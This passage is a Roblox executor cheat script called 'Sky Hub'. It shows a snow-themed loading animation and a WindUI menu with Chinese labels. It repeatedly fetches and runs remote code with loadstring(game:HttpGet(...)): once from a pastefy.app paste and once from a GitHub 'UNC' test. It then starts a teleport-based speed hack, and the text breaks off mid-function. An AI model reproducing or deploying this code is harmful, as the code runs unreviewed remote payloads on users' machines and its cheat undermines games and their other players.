local RunService = game:GetService("RunService")
local Players= game:GetService("Players")
local player= Players.LocalPlayer
local gui= Instance.new("ScreenGui")
gui.Name= "LoadingAnimation"
gui.ResetOnSpawn= false
gui.IgnoreGuiInset= true
gui.ZIndexBehavior= Enum.ZIndexBehavior.Sibling
gui.Parent= player:WaitForChild("PlayerGui")

local container = Instance.new("Frame")
container.Name= "Container"
container.Size= UDim2.new(1, 0, 1, 0)
container.BackgroundColor3= Color3.fromRGB(15, 15, 25)
container.BorderSizePixel= 0
container.Parent= gui

local snowContainer = Instance.new("Frame")
snowContainer.Name = "SnowContainer"
snowContainer.Size = UDim2.new(1, 0, 1, 0)
snowContainer.BackgroundTransparency = 1
snowContainer.ZIndex = 10
snowContainer.Parent = container

local snowflakes = {}
for i = 1, 50 do
    local snow = Instance.new("TextLabel")
    snow.Size = UDim2.new(0, math.random(8, 15), 0, math.random(8, 15))
    snow.Position = UDim2.new(math.random(), 0, -0.1, 0)
    snow.BackgroundTransparency = 1
    snow.Text = "❄"
    snow.TextColor3 = Color3.fromRGB(255, 255, 255)
    snow.TextTransparency = math.random(0, 50) / 100
    snow.TextScaled = true
    snow.Font = Enum.Font.SourceSans
    snow.ZIndex = 10
    snow.Parent = snowContainer
    
    table.insert(snowflakes, {
        frame = snow,
        speed = math.random(50, 150) / 1000,
        sway = math.random(-30, 30) / 1000,
        swayPhase = math.random() * math.pi * 2
    })
end

local letterS1 = Instance.new("TextLabel")
letterS1.Name= "S1"
letterS1.Size= UDim2.new(0, 200, 0, 300)
letterS1.Position= UDim2.new(0.5, -220, 0.5, -150)
letterS1.BackgroundTransparency= 1
letterS1.Text= "S"
letterS1.TextColor3= Color3.fromRGB(255, 50, 50)
letterS1.TextScaled= true
letterS1.Font= Enum.Font.FredokaOne
letterS1.TextStrokeColor3= Color3.fromRGB(255, 150, 150)
letterS1.TextStrokeTransparency= 0.4
letterS1.Parent= container

local letterK = Instance.new("TextLabel")
letterK.Name= "K"
letterK.Size= UDim2.new(0, 200, 0, 300)
letterK.Position= UDim2.new(0.5, -100, 0.5, -150)
letterK.BackgroundTransparency= 1
letterK.Text= "k"
letterK.TextColor3= Color3.fromRGB(100, 200, 100)
letterK.TextScaled= true
letterK.Font= Enum.Font.FredokaOne
letterK.TextStrokeColor3= Color3.fromRGB(150, 255, 150)
letterK.TextStrokeTransparency= 0.4
letterK.Parent= container

local letterY = Instance.new("TextLabel")
letterY.Name= "Y"
letterY.Size= UDim2.new(0, 200, 0, 300)
letterY.Position= UDim2.new(0.5, 20, 0.5, -150)
letterY.BackgroundTransparency= 1
letterY.Text= "y"
letterY.TextColor3= Color3.fromRGB(50, 150, 255)
letterY.TextScaled= true
letterY.Font= Enum.Font.FredokaOne
letterY.TextStrokeColor3= Color3.fromRGB(150, 200, 255)
letterY.TextStrokeTransparency= 0.4
letterY.Parent= container

local particles = Instance.new("Frame")
particles.Name= "Particles"
particles.Size= UDim2.new(1, 0, 1, 0)
particles.BackgroundTransparency= 1
particles.Parent= container

local particlePool = {}
for i= 1, 30 do
local p = Instance.new("Frame")
p.Size = UDim2.new(0, 10, 0, 10)
p.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
p.BorderSizePixel = 0
p.AnchorPoint = Vector2.new(0.5, 0.5)
p.Position = UDim2.new(0.5, 0, 0.5, 0)
p.BackgroundTransparency = 0.8
p.Parent = particles
p.Visible = false
particlePool[i] = {frame = p, active = false, life = 0, maxLife = 0, velocity = Vector2.new(0, 0), startPos = Vector2.new(0.5, 0.5)}
end

local sparkles = Instance.new("Frame")
sparkles.Name= "Sparkles"
sparkles.Size= UDim2.new(1, 0, 1, 0)
sparkles.BackgroundTransparency= 1
sparkles.Parent= container

local sparklePool = {}
for i= 1, 20 do
local s = Instance.new("Frame")
s.Size = UDim2.new(0, 6, 0, 6)
s.BackgroundColor3 = Color3.fromRGB(255, 255, 200)
s.BorderSizePixel = 0
s.AnchorPoint = Vector2.new(0.5, 0.5)
s.Position = UDim2.new(0, 0, 0, 0)
s.BackgroundTransparency = 0.9
s.Parent = sparkles
s.Visible = false
sparklePool[i] = {frame = s, active = false, life = 0, maxLife = 0, position = Vector2.new(0, 0)}
end

local time = 0
local flashPhase= 0
local pulsePhase= 0
local glowPhase= 0
local rotationPhase= 0
local hueShift= 0

local function spawnParticle(x, y, color)
for _, p in ipairs(particlePool) do
if not p.active then
p.active = true
p.life = 0
p.maxLife = 0.8 + math.random() * 0.7
p.velocity = Vector2.new((math.random() - 0.5) * 10, (math.random() - 0.5) * 10)
p.startPos = Vector2.new(x, y)
p.frame.Position = UDim2.new(x, 0, y, 0)
p.frame.BackgroundColor3 = color
p.frame.BackgroundTransparency = 0.5
p.frame.Size = UDim2.new(0, 12, 0, 12)
p.frame.Visible = true
break
end
end
end

local function spawnSparkle(x, y)
for _, s in ipairs(sparklePool) do
if not s.active then
s.active = true
s.life = 0
s.maxLife = 0.4 + math.random() * 0.3
s.position = Vector2.new(x, y)
s.frame.Position = UDim2.new(x, 0, y, 0)
s.frame.BackgroundColor3 = Color3.fromRGB(255, 255, 200)
s.frame.BackgroundTransparency = 0.7
s.frame.Size = UDim2.new(0, 6, 0, 6)
s.frame.Visible = true
break
end
end
end

RunService.RenderStepped:Connect(function(delta)
time = time + delta
flashPhase = (flashPhase + delta * 4) % (2 * math.pi)
pulsePhase = (pulsePhase + delta * 2) % (2 * math.pi)
glowPhase = (glowPhase + delta * 1.5) % (2 * math.pi)
rotationPhase = (rotationPhase + delta * 0.5) % (2 * math.pi)
hueShift = (hueShift + delta * 0.3) % 1

local flashIntensity = (math.sin(flashPhase) + 1) * 0.5
local pulseScale = 1 + 0.1 * math.sin(pulsePhase)
local glowAlpha = 0.2 + 0.15 * math.sin(glowPhase)
local rot = rotationPhase

letterS1.TextColor3 = Color3.fromHSV(hueShift, 0.9, 0.9 + 0.1 * flashIntensity)
letterK.TextColor3 = Color3.fromHSV((hueShift + 0.33) % 1, 0.9, 0.9 + 0.1 * flashIntensity)
letterY.TextColor3 = Color3.fromHSV((hueShift + 0.66) % 1, 0.9, 0.9 + 0.1 * flashIntensity)

letterS1.TextStrokeTransparency = 0.4 - 0.2 * flashIntensity
letterK.TextStrokeTransparency = 0.4 - 0.2 * flashIntensity
letterY.TextStrokeTransparency = 0.4 - 0.2 * flashIntensity

local s1Scale = pulseScale * (0.95 + 0.05 * math.sin(time * 3))
local kScale = pulseScale * (0.95 + 0.05 * math.sin(time * 3 + 0.5))
local yScale = pulseScale * (0.95 + 0.05 * math.sin(time * 3 + 1))
letterS1.Size = UDim2.new(0, 200 * s1Scale, 0, 300 * s1Scale)
letterK.Size = UDim2.new(0, 200 * kScale, 0, 300 * kScale)
letterY.Size = UDim2.new(0, 200 * yScale, 0, 300 * yScale)

letterS1.Rotation = 2 * math.sin(rot)
letterK.Rotation = 2 * math.sin(rot + 0.5)
letterY.Rotation = 2 * math.sin(rot + 1)

if math.random() < 0.3 then
    spawnParticle(0.3 + math.random() * 0.15, 0.4 + math.random() * 0.2, letterS1.TextColor3)
end
if math.random() < 0.3 then
    spawnParticle(0.45 + math.random() * 0.15, 0.4 + math.random() * 0.2, letterK.TextColor3)
end
if math.random() < 0.3 then
    spawnParticle(0.55 + math.random() * 0.15, 0.4 + math.random() * 0.2, letterY.TextColor3)
end

if math.random() < 0.2 then
    spawnSparkle(math.random(), math.random())
end

for _, p in ipairs(particlePool) do
    if p.active then
        p.life = p.life + delta
        local lifeRatio = p.life / p.maxLife
        if lifeRatio >= 1 then
            p.active = false
            p.frame.Visible = false
        else
            local x = p.startPos.X + p.velocity.X * p.life / 100
            local y = p.startPos.Y + p.velocity.Y * p.life / 100
            p.frame.Position = UDim2.new(x, 0, y, 0)
            p.frame.BackgroundTransparency = 0.5 + lifeRatio * 0.5
            p.frame.Size = UDim2.new(0, 12 * (1 - lifeRatio * 0.7), 0, 12 * (1 - lifeRatio * 0.7))
        end
    end
end

for _, s in ipairs(sparklePool) do
    if s.active then
        s.life = s.life + delta
        local lifeRatio = s.life / s.maxLife
        if lifeRatio >= 1 then
            s.active = false
            s.frame.Visible = false
        else
            s.frame.BackgroundTransparency = 0.7 + lifeRatio * 0.3
            local scale = 1 + 0.5 * math.sin(lifeRatio * math.pi)
            s.frame.Size = UDim2.new(0, 6 * scale, 0, 6 * scale)
        end
    end
end

for _, s in ipairs(snowflakes) do
    local currentY = s.frame.Position.Y.Scale
    local currentX = s.frame.Position.X.Scale
    
    s.swayPhase = s.swayPhase + delta * 2
    local swayOffset = math.sin(s.swayPhase) * s.sway
    
    local newY = currentY + s.speed * delta
    local newX = currentX + swayOffset * delta
    
    if newY > 1.1 then
        newY = -0.1
        newX = math.random()
        s.frame.TextTransparency = math.random(0, 50) / 100
    end
    
    s.frame.Position = UDim2.new(newX, 0, newY, 0)
    s.frame.Rotation = s.frame.Rotation + delta * 10
end

container.BackgroundColor3 = Color3.fromRGB(
    15 + 5 * math.sin(time * 0.5),
    15 + 5 * math.sin(time * 0.5 + 1),
    25 + 5 * math.sin(time * 0.5 + 2)
)

end)

wait(3)

local fadeTime = 1
local startTime= tick()
while tick()- startTime < fadeTime do
local alpha = (tick() - startTime) / fadeTime
container.BackgroundTransparency = alpha
letterS1.TextTransparency = alpha
letterS1.TextStrokeTransparency = 0.4 + alpha * 0.6
letterK.TextTransparency = alpha
letterK.TextStrokeTransparency = 0.4 + alpha * 0.6
letterY.TextTransparency = alpha
letterY.TextStrokeTransparency = 0.4 + alpha * 0.6
for _, p in ipairs(particlePool) do
if p.active then
p.frame.BackgroundTransparency = 0.5 + alpha * 0.5
end
end
for _, s in ipairs(sparklePool) do
if s.active then
s.frame.BackgroundTransparency = 0.7 + alpha * 0.3
end
end
for _, s in ipairs(snowflakes) do
    s.frame.TextTransparency = math.min(1, s.frame.TextTransparency + alpha)
end
RunService.RenderStepped:Wait()
end
gui:Destroy()

local WindUI

do
    local ok, result = pcall(function()
        return require("./src/Init")
    end)
    
    if ok then
        WindUI = result
    else 
        WindUI = loadstring(game:HttpGet("https://pastefy.app/zPEZCtBl/raw"))()
    end
end
if not Color3.fromHex then
    function Color3.fromHex(hex)
        hex = hex:gsub("#","")
        return Color3.fromRGB(
            tonumber(hex:sub(1,2),16),
            tonumber(hex:sub(3,4),16),
            tonumber(hex:sub(5,6),16)
        )
    end
end

function gradient(text, startColor, endColor)
    local result = ""
    local chars = {}
    for uchar in text:gmatch("[%z\1-\127\194-\244][\128-\191]*") do
        table.insert(chars, uchar)
    end
    local length = #chars
    for i = 1, length do
        local t = (i - 1) / math.max(length - 1, 1)
        local r = startColor.R + (endColor.R - startColor.R) * t
        local g = startColor.G + (endColor.G - startColor.G) * t
        local b = startColor.B + (endColor.B - startColor.B) * t
        result = result .. string.format('<font color="rgb(%d,%d,%d)">%s</font>', math.floor(r * 255), math.floor(g * 255), math.floor(b * 255), chars[i])
    end
    return result
end

local Window = WindUI:CreateWindow({
    Title = "Sky Hub",
    Icon = "crown",
    Author = "by 晓月lol",
    Folder = "脚本中心",
    Size = UDim2.fromOffset(500, 420),
    Theme = "Dark",
    Background = WindUI:Gradient({
        ["0"] = { Color = Color3.fromHex("#0f0c29"), Transparency = 0.5 },
        ["100"] = { Color = Color3.fromHex("#302b63"), Transparency = 0.5 },
    }, {
        Rotation = 45,
    }),
    User = {
        Enabled = true,
        Anonymous = false,
        Callback = function()
            WindUI:Notify({
                Title = "您的用户ID：",
                Content = (game:GetService("Players").LocalPlayer.UserId),
                Duration = 3
            })
        end
    },
    SideBarWidth = 220,
    HideSearchBar = false,
    ScrollBarEnabled = true,
    OpenButton = {
        Title = "Sky Hub",
        Icon = "crown",
        Enabled = true,
        Position = UDim2.new(0.5, 0, 0, 28),
        OnlyIcon = false,
        Draggable = true,
        OnlyMobile = true,
        CornerRadius = UDim.new(1, 0),
        StrokeThickness = 2,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.0, Color3.fromHex("#ff0080")),
            ColorSequenceKeypoint.new(0.2, Color3.fromHex("#ff4000")),
            ColorSequenceKeypoint.new(0.4, Color3.fromHex("#ffff00")),
            ColorSequenceKeypoint.new(0.6, Color3.fromHex("#00ff40")),
            ColorSequenceKeypoint.new(0.8, Color3.fromHex("#0040ff")),
            ColorSequenceKeypoint.new(1.0, Color3.fromHex("#4000ff"))
        })
    }
})
task.spawn(function()
    repeat task.wait() until Window and Window.UIElements and Window.UIElements.Main
    
    local MainFrame = Window.UIElements.Main
    
    local SnowWhiteStroke = Instance.new("UIStroke")
    SnowWhiteStroke.Name = "SnowWhiteBorder"
    SnowWhiteStroke.Parent = MainFrame
    SnowWhiteStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    SnowWhiteStroke.Thickness = 5
    SnowWhiteStroke.Transparency = 0
    SnowWhiteStroke.Color = Color3.fromRGB(255, 255, 255)
    
    local SnowGradient = Instance.new("UIGradient")
    SnowGradient.Name = "SnowWhiteGradient"
    SnowGradient.Parent = SnowWhiteStroke
    SnowGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0.0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.2, Color3.fromRGB(200, 240, 255)),
        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(180, 230, 255)),
        ColorSequenceKeypoint.new(0.8, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1.0, Color3.fromRGB(220, 245, 255))
    }
    SnowGradient.Rotation = 0
    
    game:GetService("RunService").RenderStepped:Connect(function(delta)
        SnowGradient.Rotation = (SnowGradient.Rotation + 120 * delta) % 360
    end)
end)
local function addSnowToUI()
    local mainFrame = Window.UIElements.Main
    if not mainFrame then return end
    
    local snowContainer = Instance.new("Frame")
    snowContainer.Name = "UISnowContainer"
    snowContainer.Size = UDim2.new(1, 0, 1, 0)
    snowContainer.BackgroundTransparency = 1
    snowContainer.ZIndex = 1000
    snowContainer.Parent = mainFrame
    
    local uiSnowflakes = {}
    for i = 1, 50 do
        local snow = Instance.new("TextLabel")
        snow.Size = UDim2.new(0, math.random(8, 16), 0, math.random(8, 16))
        snow.Position = UDim2.new(math.random(), 0, math.random() * -0.5, 0)
        snow.BackgroundTransparency = 1
        snow.Text = "❄"
        snow.TextColor3 = Color3.fromRGB(200, 230, 255)
        snow.TextTransparency = math.random(10, 50) / 100
        snow.TextScaled = true
        snow.Font = Enum.Font.SourceSans
        snow.ZIndex = 1000
        snow.Parent = snowContainer
        
        table.insert(uiSnowflakes, {
            frame = snow,
            speed = math.random(80, 200) / 1000,
            sway = math.random(-30, 30) / 1000,
            swayPhase = math.random() * math.pi * 2
        })
    end
    
    game:GetService("RunService").RenderStepped:Connect(function(delta)
        for _, s in ipairs(uiSnowflakes) do
            local currentY = s.frame.Position.Y.Scale
            local currentX = s.frame.Position.X.Scale
            
            s.swayPhase = s.swayPhase + delta * 2.5
            local swayOffset = math.sin(s.swayPhase) * s.sway
            
            local newY = currentY + s.speed * delta
            local newX = currentX + swayOffset * delta
            
            if newY > 1.1 then
                newY = -0.1
                newX = math.random()
                s.frame.TextTransparency = math.random(10, 50) / 100
                s.frame.Size = UDim2.new(0, math.random(8, 16), 0, math.random(8, 16))
            end
            
            s.frame.Position = UDim2.new(newX, 0, newY, 0)
            s.frame.Rotation = s.frame.Rotation + delta * 15
        end
    end)
end

task.delay(0.5, addSnowToUI)
local Tag = Window:Tag({
    Title = "Beta",
    Color = Color3.fromHex("#30ff6a")
})

task.spawn(function()
    local rainbow = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromHex("#FF0000")),
        ColorSequenceKeypoint.new(0.2, Color3.fromHex("#FFFF00")),
        ColorSequenceKeypoint.new(0.4, Color3.fromHex("#00FF00")),
        ColorSequenceKeypoint.new(0.6, Color3.fromHex("#00FFFF")),
        ColorSequenceKeypoint.new(0.8, Color3.fromHex("#0000FF")),
        ColorSequenceKeypoint.new(1, Color3.fromHex("#FF00FF"))
    })
    local rotation = 0
    while task.wait() do
        rotation = (rotation + 2) % 360
        Tag:SetColor({
            Color = rainbow,
            Rotation = rotation
        })
    end
end)
task.wait(0.1)

local titleLabel = Window.UIElements.Main.Main.Topbar.Left.Title:FindFirstChild("Title")
if titleLabel then
    titleLabel.TextColor3 = Color3.new(1, 1, 1)
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.0, Color3.fromHex("#ff0080")),
        ColorSequenceKeypoint.new(0.2, Color3.fromHex("#ff4000")),
        ColorSequenceKeypoint.new(0.4, Color3.fromHex("#ffff00")),
        ColorSequenceKeypoint.new(0.6, Color3.fromHex("#00ff40")),
        ColorSequenceKeypoint.new(0.8, Color3.fromHex("#0040ff")),
        ColorSequenceKeypoint.new(1.0, Color3.fromHex("#4000ff"))
    })
    gradient.Rotation = 0
    gradient.Parent = titleLabel
end

local openButtonTitle
if Window.OpenButtonMain and Window.OpenButtonMain.Button then
    openButtonTitle = Window.OpenButtonMain.Button.TextButton:FindFirstChild("TextLabel")
    if openButtonTitle then
        openButtonTitle.TextColor3 = Color3.new(1, 1, 1)
        local gradient = Instance.new("UIGradient")
        gradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.0, Color3.fromHex("#ff0080")),
            ColorSequenceKeypoint.new(0.2, Color3.fromHex("#ff4000")),
            ColorSequenceKeypoint.new(0.4, Color3.fromHex("#ffff00")),
            ColorSequenceKeypoint.new(0.6, Color3.fromHex("#00ff40")),
            ColorSequenceKeypoint.new(0.8, Color3.fromHex("#0040ff")),
            ColorSequenceKeypoint.new(1.0, Color3.fromHex("#4000ff"))
        })
        gradient.Rotation = 0
        gradient.Parent = openButtonTitle
    end
end

spawn(function()
    local rotation = 0
    while wait(0.05) do
        rotation = (rotation + 2) % 360
        
        local gradient = Window.UIElements.Main:FindFirstChild("Background")
        if gradient and gradient:FindFirstChildOfClass("UIGradient") then
            gradient.UIGradient.Rotation = rotation
        end
        
        local openButton = Window.OpenButtonMain
        if openButton and openButton.Button then
            local stroke = openButton.Button:FindFirstChild("UIStroke")
            if stroke and stroke:FindFirstChildOfClass("UIGradient") then
                stroke.UIGradient.Rotation = rotation
            end
        end
        
        if titleLabel then
            local titleGradient = titleLabel:FindFirstChildOfClass("UIGradient")
            if titleGradient then
                titleGradient.Rotation = rotation
            end
        end
        
        if openButtonTitle then
            local btnTitleGradient = openButtonTitle:FindFirstChildOfClass("UIGradient")
            if btnTitleGradient then
                btnTitleGradient.Rotation = rotation
            end
        end
    end
end)
Window:SetBackgroundImage("rbxassetid://76703468672784")
aboutTab = Window:Tab({
    Title = gradient("关于此脚本", Color3.fromHex("#6A11CB"), Color3.fromHex("#2575FC")),
    Icon = "rbxassetid://113620356993593",
    Locked = false,
})
Paragraph1 = aboutTab:Paragraph({
    Title = gradient("Sky hub", Color3.fromHex("#6A11CB"), Color3.fromHex("#2575FC")),
    Desc = "此脚本为缝合脚本，如有任何问题和建议可联系作者，禁止拿本脚本圈钱",
    Thumbnail = "rbxassetid://112344687181395",
    ThumbnailSize = 120,
    Locked = false,
})
Tab = Window:Tab({
    Title = "信息",
    Icon = "rbxassetid://113620356993593",
    Locked = false,
})

local executor = identifyexecutor and identifyexecutor() or "未知执行器"

Paragraph1 = Tab:Paragraph({
    Title = "您的注入器：",
    Desc = executor,
    Image = "rbxassetid://129287693322764",
    ImageSize = 42,
    Thumbnail = "rbxassetid://94512740386917",
    ThumbnailSize = 120,
    Buttons = {{
        Title = "测试您注入器的UNC",
        Variant = "Primary",
        Callback = function()
            Window:Dialog({
                Title = "Sky Hub",
                Content = "温馨提示：请勿点击多次，否则会造成游戏卡顿!",
                Icon = "bell",
                Buttons = {{
                    Title = "确定",
                    Variant = "Primary",
                    Callback = function() end,
                }}
            })
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Yungengxin/roblox/refs/heads/main/unc"))()
            local Sound = Instance.new("Sound",game:GetService("SoundService"))
            Sound.SoundId = "rbxassetid://2865227271"
            Sound:Play()
            WindUI:Notify({
                Title = "提示：",
                Content = "已成功执行，请在控制台查看UNC！",
                Icon = "bell",
                IconThemed = true,
                Duration = 5,
            })
        end,
        Icon = "bird",
    }}
})
local player = game:GetService("Players").LocalPlayer
local placeId = game.PlaceId
local gameId = game.GameId
local jobId = game.JobId
local maxPlayers = game:GetService("Players").MaxPlayers

Tab:Button({
    Title = "复制 用户ID",
    Icon = "copy",
    Callback = function()
        setclipboard(tostring(player.UserId))
        WindUI:Notify({Title="成功",Content="已复制用户ID",Duration=2})
    end
})

Tab:Button({
    Title = "复制 用户名",
    Icon = "copy",
    Callback = function()
        setclipboard(player.Name)
        WindUI:Notify({Title="成功",Content="已复制用户名",Duration=2})
    end
})

Tab:Button({
    Title = "复制 显示名",
    Icon = "copy",
    Callback = function()
        setclipboard(player.DisplayName)
        WindUI:Notify({Title="成功",Content="已复制显示名",Duration=2})
    end
})

Tab:Button({
    Title = "复制 游戏ID",
    Icon = "copy",
    Callback = function()
        setclipboard(tostring(gameId))
        WindUI:Notify({Title="成功",Content="已复制游戏ID",Duration=2})
    end
})

Tab:Button({
    Title = "复制 PlaceId",
    Icon = "copy",
    Callback = function()
        setclipboard(tostring(placeId))
        WindUI:Notify({Title="成功",Content="已复制PlaceId",Duration=2})
    end
})

Tab:Button({
    Title = "复制 服务器ID",
    Icon = "copy",
    Callback = function()
        setclipboard(jobId)
        WindUI:Notify({Title="成功",Content="已复制服务器ID",Duration=2})
    end
})

Tab:Button({
    Title = "复制 当前地图名称",
    Icon = "map",
    Callback = function()
        setclipboard(game:GetService("MarketplaceService"):GetProductInfo(placeId).Name)
        WindUI:Notify({Title="成功",Content="已复制地图名称",Duration=2})
    end
})

Tab:Button({
    Title = "复制 当前人数信息",
    Icon = "copy",
    Callback = function()
        local info = #game:GetService("Players"):GetPlayers().."/"..maxPlayers
        setclipboard(info)
        WindUI:Notify({Title="成功",Content="已复制人数信息："..info,Duration=2})
    end
})
Tab:Button({
    Title = "复制 账号年龄",
    Icon = "copy",
    Callback = function()
        setclipboard(tostring(player.AccountAge))
        WindUI:Notify({Title="成功",Content="已复制账号年龄",Duration=2})
    end
})

Tab:Button({
    Title = "复制 游戏名称",
    Icon = "copy",
    Callback = function()
        setclipboard(game:GetService("MarketplaceService"):GetProductInfo(placeId).Name)
        WindUI:Notify({Title="成功",Content="已复制游戏名称",Duration=2})
    end
})

Tab:Button({
    Title = "复制 游戏创建者",
    Icon = "copy",
    Callback = function()
        local creator = game:GetService("MarketplaceService"):GetProductInfo(placeId).Creator.Name
        setclipboard(creator)
        WindUI:Notify({Title="成功",Content="已复制创建者: "..creator,Duration=2})
    end
})

Tab:Button({
    Title = "复制 Ping值",
    Icon = "copy",
    Callback = function()
        local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        setclipboard(ping)
        WindUI:Notify({Title="成功",Content="已复制Ping: "..ping,Duration=2})
    end
})

Tab:Button({
    Title = "复制 FPS",
    Icon = "copy",
    Callback = function()
        local fps = math.floor(workspace:GetRealPhysicsFPS())
        setclipboard(tostring(fps))
        WindUI:Notify({Title="成功",Content="已复制FPS: "..fps,Duration=2})
    end
})

Tab:Button({
    Title = "复制 区域ID",
    Icon = "copy",
    Callback = function()
        setclipboard(tostring(game.GameId))
        WindUI:Notify({Title="成功",Content="已复制区域ID",Duration=2})
    end
})

Tab:Button({
    Title = "复制 玩家坐标",
    Icon = "copy",
    Callback = function()
        local pos = player.Character.HumanoidRootPart.Position
        local coords = string.format("X: %.2f, Y: %.2f, Z: %.2f", pos.X, pos.Y, pos.Z)
        setclipboard(coords)
        WindUI:Notify({Title="成功",Content="已复制坐标",Duration=2})
    end
})

Tab:Button({
    Title = "复制 玩家生命值",
    Icon = "copy",
    Callback = function()
        local health = player.Character.Humanoid.Health
        setclipboard(tostring(health))
        WindUI:Notify({Title="成功",Content="已复制生命值: "..health,Duration=2})
    end
})

Tab:Button({
    Title = "复制 玩家速度",
    Icon = "copy",
    Callback = function()
        local speed = player.Character.Humanoid.WalkSpeed
        setclipboard(tostring(speed))
        WindUI:Notify({Title="成功",Content="已复制速度: "..speed,Duration=2})
    end
})

Tab:Button({
    Title = "复制 跳跃力",
    Icon = "copy",
    Callback = function()
        local jump = player.Character.Humanoid.JumpPower
        setclipboard(tostring(jump))
        WindUI:Notify({Title="成功",Content="已复制跳跃力: "..jump,Duration=2})
    end
})

Tab:Button({
    Title = "复制 服务器区域",
    Icon = "copy",
    Callback = function()
        local region = game:GetService("LocalizationService").RobloxLocaleId
        setclipboard(region)
        WindUI:Notify({Title="成功",Content="已复制服务器区域",Duration=2})
    end
})

Tab:Button({
    Title = "复制 游戏版本",
    Icon = "copy",
    Callback = function()
        setclipboard(tostring(game.PlaceVersion))
        WindUI:Notify({Title="成功",Content="已复制游戏版本",Duration=2})
    end
})

Tab:Button({
    Title = "复制 玩家团队",
    Icon = "copy",
    Callback = function()
        local team = player.Team and player.Team.Name or "无团队"
        setclipboard(team)
        WindUI:Notify({Title="成功",Content="已复制团队: "..team,Duration=2})
    end
})

Tab:Button({
    Title = "复制 相机FOV",
    Icon = "copy",
    Callback = function()
        local fov = workspace.CurrentCamera.FieldOfView
        setclipboard(tostring(fov))
        WindUI:Notify({Title="成功",Content="已复制FOV: "..fov,Duration=2})
    end
})

Tab:Button({
    Title = "复制 游戏描述",
    Icon = "copy",
    Callback = function()
        local desc = game:GetService("MarketplaceService"):GetProductInfo(placeId).Description
        setclipboard(desc)
        WindUI:Notify({Title="成功",Content="已复制游戏描述",Duration=2})
    end
})

Tab:Button({
    Title = "复制 会员状态",
    Icon = "copy",
    Callback = function()
        local premium = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "普通"
        setclipboard(premium)
        WindUI:Notify({Title="成功",Content="会员状态: "..premium,Duration=2})
    end
})

Tab:Button({
    Title = "复制 角色外观ID",
    Icon = "copy",
    Callback = function()
        setclipboard(tostring(player.UserId))
        WindUI:Notify({Title="成功",Content="已复制外观ID",Duration=2})
    end
})

Tab:Button({
    Title="复制 游戏类型",
    Icon="copy",
    Callback=function()
        local genre = game:GetService("MarketplaceService"):GetProductInfo(placeId).Genre or "未知"
        setclipboard(tostring(genre))
        WindUI:Notify({Title="成功",Content="已复制游戏类型",Duration=2})
    end
})

Tab:Button({
    Title="复制 重力值",
    Icon="copy",
    Callback=function()
        setclipboard(tostring(workspace.Gravity))
        WindUI:Notify({Title="成功",Content="已复制重力值",Duration=2})
    end
})

Tab:Button({
    Title="复制 完整游戏链接",
    Icon="copy",
    Callback=function()
        local link = "https://www.roblox.com/games/"..placeId
        setclipboard(link)
        WindUI:Notify({Title="成功",Content="已复制游戏链接",Duration=2})
    end
})
kTab = Window:Tab({
    Title = "通用",
    Icon = "rbxassetid://113620356993593",
    Locked = false,
})
Slider = kTab:Slider({
    Title = "玩家速度",
    Step = 1,
    Value = {
        Min = 0,
        Max = 200,
        Default = 16,
    },
    Callback = function(value)
        local tpWalk = {}

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

local teleportDistance = value / 10
local isTeleporting = true
local lastTeleportTime = 0
local teleportCooldown = 0.05

local function DisableDefaultMovement()
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, false)
end

local function EnableDefaultMovement()
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, true)
end

local function Teleport()
